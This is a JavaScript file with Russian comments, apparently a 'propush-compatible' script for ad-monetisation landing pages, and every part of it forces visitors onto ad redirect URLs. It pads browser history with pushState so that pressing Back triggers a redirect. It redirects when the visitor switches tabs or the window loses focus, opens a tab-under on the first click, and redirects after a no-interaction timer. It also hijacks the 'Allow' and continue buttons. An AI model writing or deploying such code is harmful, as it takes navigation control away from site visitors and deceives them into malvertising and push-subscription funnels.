/* ./assets/scripts/common.patched.js
   Минимальный "propush-совместимый" common под твой сундук:
   - mainExit (current/new tab)
   - autoexit (после таймера, если юзер не взаимодействует)
   - back (через history trap)
   - reverse (blur/hidden)
   - tabUnderClick (первый клик -> new tab)
*/

(function () {
  "use strict";

  const cfg = window.APP_CONFIG || {};

  function qs() {
    return new URLSearchParams(window.location.search || "");
  }

  // Собираем параметры: оставляем все текущие + подставляем zoneid
  function buildParams(zoneId) {
    const p = qs();

    // Приводим к тому, что обычно ожидают pop/propush флоу:
    // если zoneId задан - добавляем zoneid и z (встречается в разных схемах)
    if (zoneId) {
      p.set("zoneid", String(zoneId));
      if (!p.get("z")) p.set("z", String(zoneId));
    }

    // abtest passthrough
    if (cfg.abtest != null && !p.get("abtest")) p.set("abtest", String(cfg.abtest));

    return p;
  }

  // Генерим URL вида https://{domain}/afu.php?...params...
  function afuUrl(zoneId, outDomain) {
    const d = (outDomain || cfg.domain || "").replace(/^https?:\/\//i, "");
    const base = `https://${d}/afu.php`;
    const p = buildParams(zoneId);
    return `${base}?${p.toString()}`;
  }

  function safeReplace(url) {
    try {
      window.location.replace(url);
    } catch (e) {
      window.location.href = url;
    }
  }

  function openNewTab(url) {
    try {
      const w = window.open(url, "_blank");
      if (w) w.opener = null;
      return !!w;
    } catch (e) {
      return false;
    }
  }

  // MAIN EXIT: new tab + current tab
  function mainExit() {
    const cur = cfg.mainExit_currentTab_zoneId;
    const nt = cfg.mainExit_newTab_zoneId;

    const curUrl = cur ? afuUrl(cur, cfg.domain) : (cfg.domain || "/");
    const ntUrl = nt ? afuUrl(nt, cfg.domain) : null;

    if (ntUrl) {
      const ok = openNewTab(ntUrl);
      if (!ok) {
        safeReplace(curUrl);
        return;
      }
      // Если вкладка открылась - добиваем текущую
      setTimeout(() => safeReplace(curUrl), 150);
      return;
    }

    safeReplace(curUrl);
  }

  // TAB UNDER: первый клик по документу -> new tab (tabUnderClick_zoneId)
  function initTabUnder() {
    const zid = cfg.tabUnderClick_zoneId;
    if (!zid) return;

    const handler = () => {
      document.removeEventListener("click", handler, true);
      openNewTab(afuUrl(zid, cfg.domain));
    };

    document.addEventListener("click", handler, true);
  }

  // AUTOEXIT: если нет взаимодействия и вкладка видима -> current tab exit
  function initAutoexit() {
    const zid = cfg.autoexit_zoneId;
    const sec = Number(cfg.autoexit_timeToRedirect || 0);
    if (!zid || !sec) return;

    let cancelled = false;
    let armed = true;

    const cancel = () => {
      if (!armed) return;
      cancelled = true;
      armed = false;
      document.removeEventListener("mousemove", cancel, true);
      document.removeEventListener("click", cancel, true);
      document.removeEventListener("scroll", cancel, true);
    };

    document.addEventListener("mousemove", cancel, true);
    document.addEventListener("click", cancel, true);
    document.addEventListener("scroll", cancel, true);

    setTimeout(() => {
      if (cancelled) return;
      if (document.visibilityState !== "visible") return;
      safeReplace(afuUrl(zid, cfg.domain));
    }, sec * 1000);
  }

  // BACK: ловим back через history trap -> back_zoneId
  function initBack() {
    const zid = cfg.back_zoneId;
    const count = Number(cfg.back_count || 0);
    if (!zid || !count) return;

    try {
      // надуваем историю
      for (let i = 0; i < count; i++) {
        history.pushState({ pp: i + 1 }, "", window.location.href);
      }
    } catch (e) {}

    window.addEventListener("popstate", () => {
      safeReplace(afuUrl(zid, cfg.domain));
    });
  }

  // REVERSE: уход со вкладки/скрытие -> reverse_zoneId
  function initReverse() {
    const zid = cfg.reverse_zoneId;
    if (!zid) return;

    let fired = false;
    const fire = () => {
      if (fired) return;
      fired = true;
      safeReplace(afuUrl(zid, cfg.domain));
    };

    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === "hidden") fire();
    });

    window.addEventListener("blur", fire);
  }

  // BIND MAIN EXIT TO твоим элементам
  function bindMainExitButtons() {
    const btn = document.getElementById("v2Continue");
    const clickAny = document.getElementById("v2ClickAny");
    const headerBtn = document.getElementById("ppAllowBtn");

    const bind = (el) => {
      if (!el || el.__ppBound) return;
      el.__ppBound = true;
      el.addEventListener("click", (ev) => {
        ev.preventDefault();
        ev.stopPropagation();
        mainExit();
      }, true);
    };

    bind(btn);
    bind(clickAny);
    bind(headerBtn);
  }

  function init() {
    if (!cfg || !cfg.domain) return;

    bindMainExitButtons();
    initTabUnder();
    initAutoexit();
    initBack();
    initReverse();

    // удобно для ручного теста в консоли:
    window.PropushExit = { mainExit };
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
